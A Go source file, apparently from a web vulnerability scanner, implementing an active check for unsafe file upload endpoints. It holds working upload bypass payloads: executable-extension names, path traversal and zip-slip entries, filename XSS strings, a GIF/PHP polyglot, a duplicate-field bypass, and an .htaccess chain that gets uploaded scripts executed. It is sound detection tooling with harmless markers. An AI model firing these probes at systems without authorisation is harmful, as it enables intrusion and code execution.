package active

import (
	"archive/zip"
	"bytes"
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"mime"
	"mime/multipart"
	"net/textproto"
	"path"
	"regexp"
	"sort"
	"strings"

	"github.com/guaidao2/crackweb/internal/checks"
	"github.com/guaidao2/crackweb/internal/diff"
	"github.com/guaidao2/crackweb/internal/finding"
	"github.com/guaidao2/crackweb/internal/httpmsg"
	"github.com/guaidao2/crackweb/internal/i18n"
)

// uploadTraversalNames escape the directory the server meant to write into. A
// server that accepts one has a filesystem bug, not just a naming one, so these
// are reported with more confidence than the extension cases.
// uploadTraversalPrefixes are the shapes that point out of the upload directory, one level
// up. The file name is generated per attempt rather than fixed, because the finding is
// confirmed by fetching the file the name would have written — and only a name whose depth
// is known can be fetched back. Deeper and masked shapes (`../../`, `....//`) resolve to
// somewhere no request can reach, so they cannot be confirmed and are not claimed.
var uploadTraversalPrefixes = []string{"../", "..\\"}

// uploadExtensionNames are names a hardened endpoint refuses. Acceptance means
// the server trusted the name; whether it is also reachable and executable
// depends on deployment, which is why the confidence is lower.
var uploadExtensionNames = []string{
	"crackweb-test.php",
	"crackweb-test.pHp",
	"crackweb-test.php.jpg",
	"crackweb-test.php.jpg.png",
	"crackweb-test.phtml",
	"crackweb-test.php5",
	"crackweb-test.php7",
	"crackweb-test.phar",
	"crackweb-test.jsp",
	"crackweb-test.jspx",
	"crackweb-test.asp",
	"crackweb-test.aspx",
	"crackweb-test.ashx",
	"crackweb-test.svg",
	// Older PHP spellings, the Java/JavaEE archives, the IIS handlers, and the
	// Apache configuration file — every one of them is a name a hardened
	// endpoint has to refuse, and each is a distinct extension the server may or
	// may not have on its deny list.
	"crackweb-test.php3",
	"crackweb-test.php4",
	"crackweb-test.phps",
	"crackweb-test.war",
	"crackweb-test.cer",
	"crackweb-test.cdx",
	"crackweb-test.asa",
	"crackweb-test.shtml",
	"crackweb-test.asmx",
	"crackweb-test.htaccess",
	"crackweb-test.php%00.jpg",
	"crackweb-test.php.",
	"crackweb-test.php ",
}

// uploadSimilarity is how alike the response must be to the genuine upload for
// the file to be considered accepted rather than rejected.
const uploadSimilarity = 0.90

// unsafeUpload reports an upload endpoint that accepts names a hardened one
// would refuse.
//
// The claim is deliberately narrow. An accepted dangerous filename is not remote
// code execution: it means a defence that should have been there was not, and a
// reviewer should look at where the file lands and whether that location
// executes. Saying so plainly is more useful than overstating it, and it is the
// difference between a finding a developer acts on and one they dismiss.
type unsafeUpload struct{}

func (unsafeUpload) ID() string                 { return "upload" }
func (unsafeUpload) TitleKey() i18n.Key         { return i18n.KeyCheckUploadTitle }
func (unsafeUpload) DescriptionKey() i18n.Key   { return i18n.KeyCheckUploadDesc }
func (unsafeUpload) RemediationKey() i18n.Key   { return i18n.KeyCheckUploadFix }
func (unsafeUpload) Severity() finding.Severity { return finding.SeverityMedium }
func (unsafeUpload) Tags() []string {
	return []string{"active", "upload", "misconfiguration"}
}
func (unsafeUpload) Passive() bool { return false }

// IsRequestLevel marks this as a check that rebuilds the request body.
func (unsafeUpload) IsRequestLevel() bool { return true }

// uploadControlNames are names no upload endpoint can accept, whatever policy it
// has: one that is a directory rather than a file, and one longer than any
// filesystem allows. They exist to find out whether this endpoint's answer means
// anything at all.
//
// The evidence this check reads is "the response to a dangerous name matched the
// response to a genuine upload", and that reading is only valid when the endpoint
// distinguishes the names it is given. Plenty do not: a handler that always
// renders the same confirmation page answers every name identically, so the two
// responses matching says nothing about whether the name was stored — and reading
// it as "accepted" reports every upload form whose page does not change. Two names
// that cannot be valid settle the question: when they come back the same way the
// genuine upload did, the response carries no verdict and the check stays quiet.
var uploadControlNames = []string{
	"crackweb-test/",
	strings.Repeat("c", 300) + ".txt",
}

// uploadTraversalEscape reports a name that wrote outside the upload directory, and proves
// it by fetching the file it wrote.
//
// The response to the upload cannot answer this. A runtime that strips the path — PHP does,
// for every upload — accepts the name and stores a safe file, and its answer is byte for
// byte the one a target that stored the file where the name pointed would give. What tells
// them apart is whether the file can be read back from above the upload directory, so that
// is what the check does: it uploads a file named after a random marker and asks the server
// for it one level up.
func uploadTraversalEscape(ctx context.Context, c *checks.Context, t *checks.Target, form *uploadForm) *finding.Finding {
	for _, prefix := range uploadTraversalPrefixes {
		marker := "crackwebtraversal" + randomSuffix() + ".txt"
		name := prefix + marker

		carrier := &uploadForm{fields: form.fields, fileField: form.fileField, content: []byte(marker)}
		mutated, response, err := sendUpload(ctx, c, t, carrier, name)
		if err != nil || response == nil || response.Status >= 400 {
			continue
		}
		if !wroteAndServes(ctx, c, t, "/"+marker, marker) {
			// The name was accepted, but nothing was written where it pointed: a server
			// that keeps only the last path segment looks exactly like this, and it is
			// doing its job.
			continue
		}

		// The control: the same shape of name without the path, under its own marker so the
		// file the probe wrote cannot be read back in its place. If this one is served from
		// the same address, then so was the other and the escape had nothing to do with it —
		// which is what a target whose upload directory *is* the web root looks like. What has
		// to hold for a finding is that the path is what made the difference.
		plainMarker := "crackwebtraversalcontrol" + randomSuffix() + ".txt"
		plainCarrier := &uploadForm{fields: form.fields, fileField: form.fileField, content: []byte(plainMarker)}
		if _, _, err := sendUpload(ctx, c, t, plainCarrier, plainMarker); err != nil {
			continue
		}
		if wroteAndServes(ctx, c, t, "/"+plainMarker, plainMarker) {
			continue
		}
		// Fetch once more: the finding's evidence is the file the check wrote, read back
		// from where the name pointed.
		retrieved, fetchErr := fetchPath(ctx, c, t, "/"+marker)
		if fetchErr != nil || retrieved == nil {
			continue
		}

		f := checks.NewFinding(unsafeUpload{}, t,
			i18n.KeyCheckUploadTitle, i18n.KeyCheckUploadDesc, i18n.KeyCheckUploadFix)
		f.Severity = finding.SeverityHigh
		// Certain: the file this check named was written above the upload directory and
		// served back from there.
		f.Confidence = finding.ConfidenceCertain
		f.Method = mutated.Method
		f.URL = mutated.URLString()
		f.Payload = name
		f.CWE = "CWE-434"
		f.References = []string{
			"https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
			"https://cwe.mitre.org/data/definitions/434.html",
		}
		f.Evidence.Request = mutated.Raw()
		f.Evidence.Response = truncate(retrieved.Body, 8192)
		f.Evidence.Baseline = truncate(t.Response.Body, 4096)
		f.Evidence.Matches = []string{
			"a file named " + name + " escaped the upload directory: it is served from /" + marker,
			"the name is used to build the target path without being confined to the upload " +
				"directory",
		}
		f.Evidence.Diff = string(retrieved.Body)[:min(len(retrieved.Body), 200)]
		return f
	}
	return nil
}

// multipartFilenameRe finds the file name in a multipart body.
var multipartFilenameRe = regexp.MustCompile(`(?i)filename="([^"]*)"`)

// firstFilenameInBody returns the name the request's own body carried, so that the baseline
// can be compared on the same footing as a probe: the name is on the page for both.
func firstFilenameInBody(req *httpmsg.Request) string {
	if req == nil || len(req.Body) == 0 {
		return ""
	}
	if match := multipartFilenameRe.FindSubmatch(req.Body); match != nil {
		return string(match[1])
	}
	return ""
}

// uploadFingerprint reduces a response, treating the file name the request carried as an echo.
//
// An endpoint that prints the name it stored — which is most of them, and how the uploader is
// told what happened — answers two uploads differently for a reason that has nothing to do
// with what it accepted. Comparing those raw responses says "these differed" when the only
// difference is the string the uploader himself sent, so the name is restored to a fixed
// value before anything is compared.
func uploadFingerprint(c *checks.Context, response *httpmsg.Response, names ...string) *diff.Fingerprint {
	pairs := make([]string, 0, 2*len(names))
	for _, name := range names {
		if name == "" {
			continue
		}
		pairs = append(pairs, name, "crackweb-upload")
	}
	if len(pairs) == 0 {
		return c.Fingerprint(response)
	}
	return c.Fingerprint(response, pairs...)
}

// benignUpload is a file no endpoint has a reason to refuse: a small GIF, declared as one,
// with the extension to match. It is the control that tells an acceptance from a refusal when
// the refusal page is a 200 with a sentence in it.
//
// It is the same type and the same leading bytes the disguise probe uses, so the two differ
// in one thing only — the file name. A control that differs in more than the property under
// test cannot separate that property from the others: with a PNG here, an endpoint that only
// accepts GIFs refuses both and the comparison says nothing.
func benignUpload() (*uploadForm, string, []byte) {
	body := uploadBenignContent
	return &uploadForm{content: body, contentType: "image/gif"}, "crackweb-benign.gif", body
}

func uploadJudgesNames(ctx context.Context, c *checks.Context, t *checks.Target, form *uploadForm, base *diff.Fingerprint) bool {
	// The baseline has to be an acceptance, or every probe is being compared against a
	// refusal: an endpoint whose page says "only images are allowed" answers the form's own
	// default content that way too, and "the response matched the genuine upload" would then
	// read "this was refused as well". A harmless upload that an endpoint accepts looks like
	// the baseline when the baseline is an acceptance, and unlike it when it is not.
	benign, benignName, benignBody := benignUpload()
	benign.fields, benign.fileField = form.fields, form.fileField
	benign.content = benignBody
	if _, benignResponse, err := sendUpload(ctx, c, t, benign, benignName); err != nil ||
		benignResponse == nil || benignResponse.Status >= 400 {
		return false
	} else if diff.CompareFingerprints(base, uploadFingerprint(c, benignResponse, benignName)).Score < uploadSimilarity {
		return false
	}

	for _, filename := range uploadControlNames {
		_, response, err := sendUpload(ctx, c, t, form, filename)
		if err != nil || response == nil {
			continue
		}
		if response.Status >= 400 {
			return true
		}
		if diff.CompareFingerprints(base, c.Fingerprint(response)).Score < uploadSimilarity {
			return true
		}
	}
	return false
}

// uploadXSSNames are file names that carry markup. An upload form that renders the
// name it was given without encoding it stores a script in its own page — the file
// is never executed, but the name is, when someone opens the listing.
var uploadXSSNames = []string{
	`<img src=x onerror=alert(document.domain)>.jpg`,
	`"><img src=x onerror=alert(document.domain)>.jpg`,
	`<svg onload=alert(document.domain)>.png`,
}

// uploadFilenameXSS reports a page that rendered the uploaded name as markup.
//
// The judgement is the reflected-XSS one, not the acceptance one: the name has to
// come back verbatim *and* land somewhere a parser runs it. A page that encodes
// the name, or prints it into a value that swallows markup, is doing its job.
func uploadFilenameXSS(ctx context.Context, c *checks.Context, t *checks.Target, form *uploadForm) *finding.Finding {
	for _, name := range uploadXSSNames {
		mutated, response, err := sendUpload(ctx, c, t, form, name)
		if err != nil || response == nil || response.Status >= 400 {
			continue
		}
		body := string(response.Body)
		if !strings.Contains(body, name) || !executableContext(body, name) {
			continue
		}
		f := checks.NewFinding(unsafeUpload{}, t,
			i18n.KeyCheckUploadTitle, i18n.KeyCheckUploadDesc, i18n.KeyCheckUploadFix)
		f.Severity = finding.SeverityHigh
		f.Confidence = finding.ConfidenceFirm
		f.Method = mutated.Method
		f.URL = mutated.URLString()
		f.Payload = name
		f.CWE = "CWE-79"
		f.References = []string{
			"https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
			"https://cwe.mitre.org/data/definitions/79.html",
		}
		f.Evidence.Request = mutated.Raw()
		f.Evidence.Response = truncate(response.Body, 8192)
		f.Evidence.Baseline = truncate(t.Response.Body, 4096)
		f.Evidence.Matches = []string{
			"the uploaded name " + name + " came back unencoded and is parsed as markup: " +
				describeContext(body, name),
			"the file itself is never executed; the name is, wherever it is displayed",
		}
		f.Evidence.Diff = extractAround(body, name, 200)
		return f
	}
	return nil
}

// uploadZipSlip reports an archive whose entries were written outside the directory it was
// extracted into.
//
// The evidence is the archived file itself, read back from the web root: the archive
// carried `../<marker>.txt`, the extraction wrote it above the directory it was meant for,
// and the content this check chose is now being served. Nothing in the upload's own
// response says any of that — a traversal that works and one that is refused look the same
// there — which is why the check has to go and fetch what it wrote.
func uploadZipSlip(ctx context.Context, c *checks.Context, t *checks.Target, form *uploadForm) *finding.Finding {
	marker := "crackwebzipslip" + randomSuffix()
	archive, err := zipWithTraversalEntry("../"+marker+".txt", []byte(marker))
	if err != nil {
		return nil
	}

	// The same form, with an archive for a body. Everything else about the request
	// stays as the endpoint expects it.
	carrier := &uploadForm{fields: form.fields, fileField: form.fileField, content: archive}
	if _, response, err := sendUpload(ctx, c, t, carrier, "archive.zip"); err != nil ||
		response == nil || response.Status >= 400 {
		return nil
	}

	// One level up from the extraction directory is where a web server starts serving.
	if !wroteAndServes(ctx, c, t, "/"+marker+".txt", marker) {
		return nil
	}

	// The control: an archive whose only entry has no path. If that is served from the same
	// address, the extraction directory *is* the place being read, and the escaping entry
	// proved nothing — the same reasoning, and the same shape of target, as the traversal
	// probe. A finding needs the path to be what made the difference, and it needs its own
	// marker so the file the first archive wrote cannot be read back in its place.
	plainMarker := "crackwebzipslipcontrol" + randomSuffix()
	plainArchive, err := zipWithTraversalEntry(plainMarker+".txt", []byte(plainMarker))
	if err != nil {
		return nil
	}
	plainCarrier := &uploadForm{fields: form.fields, fileField: form.fileField, content: plainArchive}
	if _, response, err := sendUpload(ctx, c, t, plainCarrier, "archive.zip"); err != nil ||
		response == nil || response.Status >= 400 {
		return nil
	}
	if wroteAndServes(ctx, c, t, "/"+plainMarker+".txt", plainMarker) {
		return nil
	}

	retrieved, err := fetchPath(ctx, c, t, "/"+marker+".txt")
	if err != nil || retrieved == nil {
		return nil
	}

	f := checks.NewFinding(unsafeUpload{}, t,
		i18n.KeyCheckUploadTitle, i18n.KeyCheckUploadDesc, i18n.KeyCheckUploadFix)
	f.Severity = finding.SeverityHigh
	// Certain: the content this check chose came back, so it was written where the entry
	// pointed. There is nothing left to interpret.
	f.Confidence = finding.ConfidenceCertain
	f.Method = "POST"
	f.URL = t.Request.URLString()
	f.Payload = "archive entry ../" + marker + ".txt"
	f.CWE = "CWE-22"
	f.References = []string{
		"https://security.snyk.io/research/zip-slip-vulnerability",
		"https://cwe.mitre.org/data/definitions/22.html",
	}
	f.Evidence.Request = t.Request.Raw()
	f.Evidence.Response = truncate(retrieved.Body, 4096)
	f.Evidence.Baseline = truncate(t.Response.Body, 4096)
	f.Evidence.Matches = []string{
		"an archive entry named ../" + marker + ".txt was written above the extraction " +
			"directory: the file is now served from /" + marker + ".txt",
		"the entry name is used to build the target path without being confined to the " +
			"extraction directory",
	}
	f.Evidence.Diff = string(retrieved.Body)[:min(len(retrieved.Body), 200)]
	return f
}

// zipWithTraversalEntry builds an archive carrying one entry under the given name.
func zipWithTraversalEntry(name string, content []byte) ([]byte, error) {
	var buffer bytes.Buffer
	writer := zip.NewWriter(&buffer)
	entry, err := writer.Create(name)
	if err != nil {
		return nil, err
	}
	if _, err := entry.Write(content); err != nil {
		return nil, err
	}
	if err := writer.Close(); err != nil {
		return nil, err
	}
	return buffer.Bytes(), nil
}

// randomSuffix returns a short random hex string, so the file this check writes cannot
// collide with anything and cannot be guessed in advance.
func randomSuffix() string {
	var raw [8]byte
	if _, err := rand.Read(raw[:]); err != nil {
		return "probe"
	}
	return hex.EncodeToString(raw[:])
}

// wroteAndServes reports whether a path serves back the content this check wrote.
//
// The status code is half the judgement, and the half that is easy to leave out: a 404 page
// routinely quotes the address it was asked for, so a body containing the marker is also
// what "nothing is there" looks like on a server whose error page echoes the request. A
// 200 that carries the marker is the only reading that means the file was written and is
// being served.
func wroteAndServes(ctx context.Context, c *checks.Context, t *checks.Target, path, marker string) bool {
	fetched, err := fetchPath(ctx, c, t, path)
	if err != nil || fetched == nil || fetched.Status != 200 {
		return false
	}
	return strings.Contains(string(fetched.Body), marker)
}

// fetchPath asks the target for a path, with the request it was given as the template.
func fetchPath(ctx context.Context, c *checks.Context, t *checks.Target, path string) (*httpmsg.Response, error) {
	if t.Request == nil || t.Request.URL == nil {
		return nil, nil
	}
	request := t.Request.Clone()
	request.Method = "GET"
	request.Body = nil
	request.Header.Del("Content-Type")
	request.Header.Del("Content-Length")
	address := *t.Request.URL
	address.Path = path
	address.RawPath = ""
	address.RawQuery = ""
	address.Fragment = ""
	request.URL = &address
	return c.Do(ctx, request)
}

// createPart writes the file part, declaring the type the form asks for. Without one it is
// the same `application/octet-stream` a browser would send, which is what every other probe
// in this check uses.
func (f *uploadForm) createPart(writer *multipart.Writer, filename string) (io.Writer, error) {
	if f.contentType == "" {
		return writer.CreateFormFile(f.fileField, filename)
	}
	header := textproto.MIMEHeader{}
	header.Set("Content-Disposition",
		fmt.Sprintf("form-data; name=%q; filename=%q", f.fileField, filename))
	header.Set("Content-Type", f.contentType)
	return writer.CreatePart(header)
}

// disguiseHasARefusal reports whether the endpoint answered anything differently from the
// harmless image — the baseline, or a name no endpoint can accept. Without one of those, the
// endpoint says the same thing about every upload, and "this one was accepted" is a sentence
// its answers cannot support.
func disguiseHasARefusal(ctx context.Context, c *checks.Context, t *checks.Target, form *uploadForm, base, accepted *diff.Fingerprint) bool {
	if diff.CompareFingerprints(accepted, base).Score < uploadSimilarity {
		return true
	}
	if len(uploadControlNames) == 0 {
		return false
	}
	_, refusedResponse, err := sendUpload(ctx, c, t, carrierFor(form), uploadControlNames[0])
	if err != nil || refusedResponse == nil {
		return false
	}
	return diff.CompareFingerprints(accepted, uploadFingerprint(c, refusedResponse, uploadControlNames[0])).Score < uploadSimilarity
}

// carrierFor returns the form with a harmless body, for a request that is about the name.
func carrierFor(form *uploadForm) *uploadForm {
	_, _, body := benignUpload()
	return &uploadForm{fields: form.fields, fileField: form.fileField, content: body, contentType: "image/gif"}
}

// uploadDisguiseNames are the dangerous names worth trying behind a harmless declared type.
var uploadDisguiseNames = []string{
	"crackweb-test.php",
	"crackweb-test.phtml",
	"crackweb-test.php.jpg",
}

// uploadDisguiseTypes are the declared types an endpoint that trusts the declaration will
// accept.
var uploadDisguiseTypes = []string{"image/png", "image/gif", "image/jpeg"}

// uploadDisguiseBody is what a file that is both a picture and a program looks like: the
// bytes a format check reads, and the code a server would run.
var uploadDisguiseBody = []byte("GIF89a<?php echo 1; ?>")

// uploadBenignContent is what a probe uploads. It is a valid image header so that a target
// checking the type is not refused for the wrong reason, and it carries no script so that the
// upload is itself harmless. The same bytes are what the retrieval check looks for.
var uploadBenignContent = []byte("GIF89a benign")

// uploadContentMarker is what has to come back for an upload to count as served.
var uploadContentMarker = uploadBenignContent

// uploadDisguise reports an endpoint that accepted a dangerous name because the upload
// declared itself to be an image.
//
// The other probes send a dangerous name with the type a browser would send by default, so
// an endpoint that judges the declared type — and the two leading bytes of the content —
// refuses them all while being no safer. This is the same name behind a type that passes
// both checks, and the finding says which claim did the work.
func uploadDisguise(ctx context.Context, c *checks.Context, t *checks.Target, form *uploadForm, base *diff.Fingerprint) *finding.Finding {
	// The control here is the harmless image, not the form's own default: an endpoint that
	// only accepts images refuses the default, and its success page — which is the thing a
	// disguised upload has to match — is the one the harmless image produces.
	benign, benignName, benignBody := benignUpload()
	benign.fields, benign.fileField = form.fields, form.fileField
	benign.content = benignBody
	_, benignResponse, err := sendUpload(ctx, c, t, benign, benignName)
	if err != nil || benignResponse == nil || benignResponse.Status >= 400 {
		return nil
	}
	accepted := uploadFingerprint(c, benignResponse, benignName)

	// And something the endpoint refuses, or the acceptance means nothing. It does not have to
	// be a name: an endpoint that judges only the declared type refuses the form's own default
	// content and accepts everything else, which is exactly the shape being tested — so the
	// baseline counts as a refusal when it differs from the harmless image, and a name no
	// endpoint can accept counts when the baseline does not differ. What must not be the case
	// is that every upload gets the same answer, which is the one thing this must not report.
	if !disguiseHasARefusal(ctx, c, t, form, base, accepted) {
		return nil
	}

	for _, contentType := range uploadDisguiseTypes {
		for _, filename := range uploadDisguiseNames {
			carrier := &uploadForm{
				fields: form.fields, fileField: form.fileField,
				content: uploadDisguiseBody, contentType: contentType,
			}
			mutated, response, err := sendUpload(ctx, c, t, carrier, filename)
			if err != nil || response == nil || response.Status >= 400 {
				continue
			}
			similarity := diff.CompareFingerprints(accepted, c.Fingerprint(response)).Score
			if similarity < uploadSimilarity {
				continue
			}

			f := checks.NewFinding(unsafeUpload{}, t,
				i18n.KeyCheckUploadTitle, i18n.KeyCheckUploadDesc, i18n.KeyCheckUploadFix)
			f.Severity = finding.SeverityMedium
			// Firm rather than tentative: the response is the endpoint's own success page —
			// the one a harmless image produces — reached with an executable name.
			f.Confidence = finding.ConfidenceFirm
			f.Method = mutated.Method
			f.URL = mutated.URLString()
			f.Payload = filename + " declared as " + contentType
			f.CWE = "CWE-434"
			f.References = []string{
				"https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
				"https://cwe.mitre.org/data/definitions/434.html",
			}
			f.Evidence.Request = mutated.Raw()
			f.Evidence.Response = truncate(response.Body, 8192)
			f.Evidence.Baseline = truncate(t.Response.Body, 4096)
			f.Evidence.Matches = []string{
				"the name " + filename + " was accepted once the upload declared itself " +
					contentType + " and began with the two bytes of a GIF (" + string(uploadDisguiseBody[:6]) + ")",
				"the endpoint decides from the declared type and the leading bytes, both of which " +
					"the uploader writes; the file is stored with an executable extension",
			}
			return f
		}
	}
	return nil
}

// uploadDuplicateField reports an endpoint whose validation and whose storage disagree about
// which file they are looking at.
//
// A multipart body may carry the same field twice. Different layers pick different ones —
// a validator that reads the first entry while the framework stores the last, or the reverse
// — and a caller who sends a harmless file in the position the check reads and an executable
// one in the position the code uses gets past both. The judgement is a comparison, not a
// response: a single dangerous name has to be refused, and the pair accepted, or nothing was
// bypassed.
func uploadDuplicateField(ctx context.Context, c *checks.Context, t *checks.Target, form *uploadForm, base *diff.Fingerprint) *finding.Finding {
	benign, benignName, benignBody := benignUpload()
	benign.fields, benign.fileField = form.fields, form.fileField
	if _, benignResponse, err := sendUpload(ctx, c, t, benign, benignName); err != nil ||
		benignResponse == nil || benignResponse.Status >= 400 {
		return nil
	} else {
		accepted := c.Fingerprint(benignResponse)

		// The control: the dangerous name on its own, which this endpoint should refuse.
		// Without a refusal there is nothing a bypass could have got past.
		carrier := &uploadForm{fields: form.fields, fileField: form.fileField,
			content: uploadDisguiseBody, contentType: "image/gif"}
		singleName := uploadDisguiseNames[0]
		if _, singleResponse, err := sendUpload(ctx, c, t, carrier, singleName); err != nil ||
			singleResponse == nil {
			return nil
		} else if diff.CompareFingerprints(accepted, uploadFingerprint(c, singleResponse, singleName)).Score >= uploadSimilarity {
			return nil
		}

		for _, contentType := range uploadDisguiseTypes {
			mutated, response, err := sendUploadPair(ctx, c, t, form,
				benignName, benignBody, contentType, singleName, uploadDisguiseBody)
			if err != nil || response == nil || response.Status >= 400 {
				continue
			}
			if diff.CompareFingerprints(accepted, uploadFingerprint(c, response, benignName, singleName)).Score < uploadSimilarity {
				continue
			}

			f := checks.NewFinding(unsafeUpload{}, t,
				i18n.KeyCheckUploadTitle, i18n.KeyCheckUploadDesc, i18n.KeyCheckUploadFix)
			f.Severity = finding.SeverityMedium
			// Firm: one request was refused and another accepted, and the only difference
			// between them is the extra part.
			f.Confidence = finding.ConfidenceFirm
			f.Method = mutated.Method
			f.URL = mutated.URLString()
			f.Payload = singleName + " sent twice under " + string(form.fileField) +
				", first as " + benignName + " declared " + contentType
			f.CWE = "CWE-434"
			f.References = []string{
				"https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
				"https://cwe.mitre.org/data/definitions/434.html",
			}
			f.Evidence.Request = mutated.Raw()
			f.Evidence.Response = truncate(response.Body, 8192)
			f.Evidence.Baseline = truncate(benignResponse.Body, 4096)
			f.Evidence.Matches = []string{
				singleName + " on its own was refused, and the same name accepted when the " +
					"field carried a harmless file first",
				"the validation and the storage are not looking at the same entry of the " +
					"multipart body",
			}
			return f
		}
	}
	return nil
}

// sendUploadPair sends one field twice: a harmless file declared as the given type, then the
// dangerous one. Which position a given layer reads is the thing being probed.
func sendUploadPair(ctx context.Context, c *checks.Context, t *checks.Target, form *uploadForm,
	firstName string, firstBody []byte, firstType, secondName string, secondBody []byte) (*httpmsg.Request, *httpmsg.Response, error) {
	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)
	fields := append([]httpmsg.KV(nil), form.fields...)
	sort.SliceStable(fields, func(i, j int) bool { return fields[i].Name < fields[j].Name })
	for _, field := range fields {
		_ = writer.WriteField(field.Name, field.Value)
	}
	if err := writeFilePart(writer, form.fileField, firstName, firstType, firstBody); err != nil {
		return nil, nil, err
	}
	if err := writeFilePart(writer, form.fileField, secondName, "", secondBody); err != nil {
		return nil, nil, err
	}
	_ = writer.Close()

	mutated := t.Request.Clone()
	mutated.Body = buf.Bytes()
	mutated.Header.Set("Content-Type", writer.FormDataContentType())
	mutated.Header.Set("Content-Length", fmt.Sprint(buf.Len()))
	mutated.Origin = httpmsg.OriginReplay
	response, err := c.Do(ctx, mutated)
	if err != nil {
		return mutated, nil, err
	}
	return mutated, response, nil
}

// writeFilePart writes one file part, declaring a type when one is given.
func writeFilePart(writer *multipart.Writer, field, filename, contentType string, body []byte) error {
	carrier := &uploadForm{fileField: field, contentType: contentType}
	part, err := carrier.createPart(writer, filename)
	if err != nil {
		return err
	}
	_, err = part.Write(body)
	return err
}

// uploadHtaccessChain reports an endpoint that will store an Apache configuration file
// beside the files it serves.
//
// The two requests together are the whole attack: a `.htaccess` that tells the server to run
// a file type it would not otherwise run, and a file of that type. What the check writes is
// deliberately harmless — a script that echoes a marker and nothing else — because the point
// is to find out whether the file was executed, and that question can only be answered by
// running it. The proof is the marker coming back with no PHP tag around it: the source would
// have arrived verbatim, as it does for every other extension.
//
// The extension is random so that the configuration affects nothing else on the target, and
// the configuration says nothing but which extension to run.
func uploadHtaccessChain(ctx context.Context, c *checks.Context, t *checks.Target, form *uploadForm) *finding.Finding {
	marker := "crackwebhtaccess" + randomSuffix()
	extension := "c" + randomSuffix()[:6]
	payloadName := marker + "." + extension

	configuration := "AddType application/x-httpd-php ." + extension + "\n"
	script := "<?php echo \"" + marker + "\"; ?>"

	configCarrier := &uploadForm{fields: form.fields, fileField: form.fileField, content: []byte(configuration)}
	if _, response, err := sendUpload(ctx, c, t, configCarrier, ".htaccess"); err != nil ||
		response == nil || response.Status >= 400 {
		return nil
	}
	scriptCarrier := &uploadForm{fields: form.fields, fileField: form.fileField, content: []byte(script)}
	if _, response, err := sendUpload(ctx, c, t, scriptCarrier, payloadName); err != nil ||
		response == nil || response.Status >= 400 {
		return nil
	}

	fetched, err := fetchPath(ctx, c, t, "/"+payloadName)
	if err != nil || fetched == nil || fetched.Status != 200 {
		return nil
	}
	body := string(fetched.Body)
	// The marker without the tag: the server ran the file. A body carrying the source means
	// the file was served, which is what happens to every extension that was not configured.
	if !strings.Contains(body, marker) || strings.Contains(body, "<?php") {
		return nil
	}

	f := checks.NewFinding(unsafeUpload{}, t,
		i18n.KeyCheckUploadTitle, i18n.KeyCheckUploadDesc, i18n.KeyCheckUploadFix)
	f.Severity = finding.SeverityCritical
	// Certain: the script this check wrote produced output, which only execution explains.
	f.Confidence = finding.ConfidenceCertain
	f.Method = "POST"
	f.URL = t.Request.URLString()
	f.Payload = ".htaccess declaring ." + extension + " as PHP, then " + payloadName
	f.CWE = "CWE-434"
	f.References = []string{
		"https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
		"https://cwe.mitre.org/data/definitions/434.html",
	}
	f.Evidence.Request = t.Request.Raw()
	f.Evidence.Response = truncate(fetched.Body, 4096)
	f.Evidence.Baseline = truncate(t.Response.Body, 4096)
	f.Evidence.Matches = []string{
		"an uploaded .htaccess made the server run ." + extension + ", and the file the check " +
			"then uploaded ran: /" + payloadName + " answered with its output (" + marker + ")",
		"the script is the check's own and echoes a marker; the server executed it",
	}
	f.Evidence.Diff = body[:min(len(body), 200)]
	return f
}

func (unsafeUpload) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	if t == nil || t.Request == nil || t.Response == nil {
		return nil
	}
	form, ok := parseUploadForm(t.Request)
	if !ok {
		return nil
	}
	// A baseline that already failed gives nothing to compare against.
	if t.Response.Status >= 400 {
		return nil
	}
	// The baseline's own upload name is normalised too: an endpoint that prints the name it
	// stored answers the baseline and a probe differently for that reason alone, and a
	// comparison between them would be between two spellings of the same page.
	baseName := firstFilenameInBody(t.Request)
	base := uploadFingerprint(c, t.Response, baseName)
	if base == nil || base.NormLen == 0 {
		base = c.BaselineFingerprint(t)
	}

	// Before reading anything into this endpoint's answers, find out whether it gives one. A
	// handler whose page never changes cannot be judged from its responses at all — see
	// uploadControlNames.
	//
	// The disguise probe is tried either way, because it carries its own control: an endpoint
	// that refuses the form's own default content is exactly the one it is for, and the
	// judgement above (which compares against that default) is the one that cannot be made
	// there.
	if !uploadJudgesNames(ctx, c, t, form, base) {
		if f := uploadDisguise(ctx, c, t, form, base); f != nil {
			return []*finding.Finding{f}
		}
		return nil
	}

	// The order is by strength of claim, and one finding is more useful than
	// seventeen variations of "it accepted a name": a name that escapes the
	// directory, then an archive that does escape it, then a name that merely
	// carries an extension the server should not store.
	// The escape is confirmed by fetching the file, so it is asked first and on its own.
	if f := uploadTraversalEscape(ctx, c, t, form); f != nil {
		return []*finding.Finding{f}
	}

	// The chain that ends in execution: a configuration file and a file for it to run. It is
	// asked before the declared-type probes because it is the stronger claim by far.
	if f := uploadHtaccessChain(ctx, c, t, form); f != nil {
		return []*finding.Finding{f}
	}
	// Before the names: an endpoint whose validation and storage disagree is a stronger
	// claim than one that merely accepts a dangerous name.
	if f := uploadDuplicateField(ctx, c, t, form, base); f != nil {
		return []*finding.Finding{f}
	}

	for _, group := range []struct {
		names      []string
		confidence finding.Confidence
		kind       string
		// zipSlip marks the group the archive probe is asked before, once.
		zipSlip bool
	}{
		{uploadExtensionNames, finding.ConfidenceTentative, "the file name carries an executable extension", true},
	} {
		// An archive whose entries escape is a stronger claim than any single name,
		// and it is asked once, before the names are tried: a hardened endpoint
		// refuses every dangerous extension, so a probe hung off the end of that
		// loop would never run on exactly the targets that need it.
		if group.zipSlip {
			if f := uploadZipSlip(ctx, c, t, form); f != nil {
				return []*finding.Finding{f}
			}
		}
		for _, filename := range group.names {
			mutated, response, err := sendUpload(ctx, c, t, form, filename)
			if err != nil || response == nil {
				continue
			}
			if response.Status >= 400 {
				continue
			}
			similarity := diff.CompareFingerprints(base, uploadFingerprint(c, response, filename)).Score
			if similarity < uploadSimilarity {
				// The server answered differently, which is what a rejection
				// looks like from here.
				continue
			}
			// Accepting the name only says the endpoint has no list of extensions it
			// refuses. Every endpoint that stores a file somewhere does that — the file
